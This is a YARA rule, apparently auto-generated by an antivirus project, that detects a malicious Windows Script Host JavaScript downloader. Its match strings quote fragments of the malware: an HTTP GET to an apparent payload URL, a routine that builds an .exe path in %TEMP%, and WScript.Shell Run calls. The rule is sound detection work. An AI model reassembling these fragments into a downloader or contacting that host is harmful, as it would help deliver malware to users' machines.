rule sig_20160329_550db883fc1113b72b0a1abb526928e6 {
  meta:
    description = "datamaliciousorder - file 20160329_550db883fc1113b72b0a1abb526928e6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "57c92e9ca48ed36cda4d426adbf36b36aed70a65d7835b0daa4dd92596db81d5"

  strings:
    $s1  = "Cy[MS](\"GET\", \"http://blog.saletron.net/li9soz\", false);" fullword ascii
    $s2  = "function zr() {return n[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"iQlAy3BN.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[QU](C0() * 11); if (Cy[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function km(K, u){w = w * 1; return K - u;};" fullword ascii
    $s5  = "var n = function nm() {return WScript[I](\"WScript.Shell\");}(), TI = 11;" fullword ascii
    $s6  = "function SD(){return \"\" + H;};" fullword ascii
    $s7  = "function C() {return ((aH == true) && (aH == zj)) ? 1 : w;};" fullword ascii
    $s8  = "function d(A){n[\"Run\"](A, w, w);};" fullword ascii
    $s9  = " while (f){" fullword ascii
    $s10 = "var vN = new this[\"Date\"]();" fullword ascii
    $s11 = "function C0(){return 22;};" fullword ascii
    $s12 = "return km(Yr, g);" fullword ascii
    $s13 = "function c(Zj) {var I0 = (1, 2, 3, 4, 5, Zj); return I0;};" fullword ascii
    $s14 = "function nP()" fullword ascii
    $s15 = "function R(){return I;};" fullword ascii
    $s16 = "var R0 = false;" fullword ascii
    $s17 = "zj = true; " fullword ascii
    $s18 = "aH = true; " fullword ascii
    $s19 = "var aH = false;" fullword ascii
    $s20 = "var zj = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}